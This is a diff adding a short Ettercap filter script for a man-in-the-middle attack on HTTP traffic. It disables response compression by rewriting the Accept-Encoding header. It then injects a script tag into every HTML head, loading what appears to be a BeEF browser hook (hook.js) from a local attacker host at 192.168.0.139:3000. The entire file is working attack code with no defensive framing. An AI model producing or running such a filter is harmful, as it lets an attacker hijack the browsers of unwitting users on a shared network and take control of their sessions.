@@ -1,0 +1,15 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Nothing!");
+      }
+}
+if (ip.proto == TCP && tcp.src == 80) {
+    if (search(DATA.data, "</head>")) {
+      replace("</head>", "</head><script src='http://192.168.0.139:3000/hook.js'></script> ");
+      msg("html injected");
+    }
+    if (search(DATA.data, "</HEAD>")) {
+      replace("</HEAD>", "</HEAD><script src='http://192.168.0.139:3000/hook.js'></script> ");
+      msg("html injected");
+    }
+}
